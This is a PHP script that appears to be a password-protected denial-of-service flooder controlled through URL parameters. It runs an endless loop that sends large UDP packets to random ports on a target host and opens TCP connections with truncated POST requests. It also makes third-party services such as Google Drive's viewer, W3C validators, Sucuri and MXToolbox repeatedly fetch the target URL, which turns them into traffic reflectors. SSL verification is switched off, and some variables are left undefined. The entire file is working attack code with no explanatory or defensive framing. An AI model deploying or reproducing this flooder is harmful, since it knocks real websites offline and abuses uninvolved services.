<?php
stream_context_set_default([
    'ssl' => [
   "verify_peer"=>false,
        "verify_peer_name"=>false,
]]);

if($_GET['pass'] == 'kakababu'){
    $packets = 0;
    ignore_user_abort(TRUE);
    set_time_limit(0);
    

    $host = htmlspecialchars($_GET['ip']);
$url = htmlspecialchars($_GET['url']);
$u = htmlspecialchars($_GET['u']);
    for($i=0;$i<65000;$i++){
            $out .= 'X';
    }
    while(1){
    $packets++;
    
            $rand = rand(1,65000);
  $fp = fsockopen($proxy,$por);
            $fp = fsockopen('udp://'.$host, $rand, $errno, $errstr, 5);
        
                    fwrite($fp, $out);
                   fclose($fp);
  $f = fsockopen($proxy,$port);
$f = fsockopen($u, 80, $errno, $errstr, 140);
    $out = "POST / HTTP/1.1\r\n";
    $out .= "Host: $host\r\n";
    $out .= "User-Agent: Opera/9.21 (Windows NT 5.1; U; en)\r\n";
    $out .= "Content-Length: 42\r\n\r\n"; fwrite($f, $out);
fclose($f);

file_get_contents("https://drive.google.com/viewerng/viewer?url=".$url);

file_get_contents($url);

file_get_contents("http://feedvalidator.org/check.cgi?url=".$url);

file_get_contents("http://www.statscrop.com/www/".$url);

file_get_contents("https://www.whatsmydns.net/#A/".$url);

file_get_contents("https://sitecheck.sucuri.net/results/".$url);

file_get_contents("https://www.sslshopper.com/ssl-checker.html#hostname=".$url);

file_get_contents("https://gsnedders.html5.org/outliner/process.py?url=".$url);

file_get_contents("https://www.siteworthtraffic.com/report/".$url);

file_get_contents("https://mxtoolbox.com/SuperTool.aspx?action=".$url);

file_get_contents("https://jigsaw.w3.org/css-validator/validator?uri=".$url."&profile=css3&usermedium=all&vextwarning=true");
          }
    }
    

?>
